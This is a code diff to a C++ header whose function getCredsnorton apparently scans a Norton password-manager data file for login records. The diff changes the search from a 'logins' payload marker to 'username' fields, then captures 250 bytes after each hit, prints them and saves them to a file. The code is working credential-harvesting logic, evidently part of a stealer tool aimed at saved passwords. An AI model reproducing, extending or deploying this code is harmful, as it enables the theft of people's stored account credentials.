@@ -1,7 +1,6 @@
 #pragma once
 #include <iostream>
 #include <fstream>
-#include <string>
 #include <vector>
 #include "../core/saveFile.h"
 
@@ -13,44 +12,34 @@ int getCredsnorton(std::string filename) {
         return 1;
     }
 
-    std::string searchKeyword = "\"payload\":{\"logins\":";
-    std::string foundData;
+    std::string searchSequence = "\"username\":";
+    std::vector<char> foundData;
 
     while (!file.eof()) {
         char c;
         file.get(c);
 
-        if (c == searchKeyword[foundData.size()]) {
-            foundData += c;
-            if (foundData == searchKeyword) {
-                // We found the search keyword, now collect data until 10 binary spaces (00) are found
-                std::vector<unsigned char> extractedData;
-                int consecutiveSpaces = 0;
-
-                while (!file.eof()) {
-                    file.read(reinterpret_cast<char*>(&c), sizeof(c));
-                    if (c == 0x00) {
-                        consecutiveSpaces++;
-                        if (consecutiveSpaces == 10) {
-                            break; // 10 consecutive binary spaces found
-                            // We can check for more spaces if we want
-                        }
-                    }
-                    else {
-                        consecutiveSpaces = 0;
+        if (c == searchSequence[foundData.size()]) {
+            foundData.push_back(c);
+            if (foundData.size() == searchSequence.size()) {
+                // We found the search sequence, now collect the next 250 binary characters
+                std::vector<char> extractedData;
+                for (int i = 0; i < 250; i++) {
+                    file.get(c);
+                    if (file.eof()) {
+                        break;
                     }
                     extractedData.push_back(c);
                 }
 
-                // Convert the binary data to a UTF-8 string
+                // Print the extracted data as UTF-8
                 std::string utf8ExtractedData(extractedData.begin(), extractedData.end());
-
-                // Print the extracted UTF-8 string
-                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;
+                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;  // Add a newline
 
                 //Save into file
                 saveFile(utf8ExtractedData);
 
+                // Clear the foundData vector to search for the next occurrence
                 foundData.clear();
             }
         }
